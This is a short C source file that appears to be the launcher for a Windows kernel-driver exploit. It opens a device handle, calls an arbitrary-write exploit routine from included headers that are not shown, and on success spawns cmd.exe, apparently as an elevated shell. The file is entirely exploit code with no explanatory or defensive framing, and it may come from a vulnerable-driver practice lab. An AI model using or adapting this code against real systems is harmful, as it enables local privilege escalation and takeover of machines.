#include "common.h"
#include "BufferOverflow.h"
#include "ArbitraryWrite.h"

int main() {
	HANDLE hDevice = NULL;
	BOOL isExploit = TRUE;

	printf("HELLO WORLD!\n");
	hDevice = CreateFileW(
		DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hDevice == INVALID_HANDLE_VALUE) return 1;
	
	system("pause");
	isExploit = ArbitraryWriteSEMPExp(hDevice);

	if (isExploit) system("cmd.exe");

	CloseHandle(hDevice);
	return 0;
}
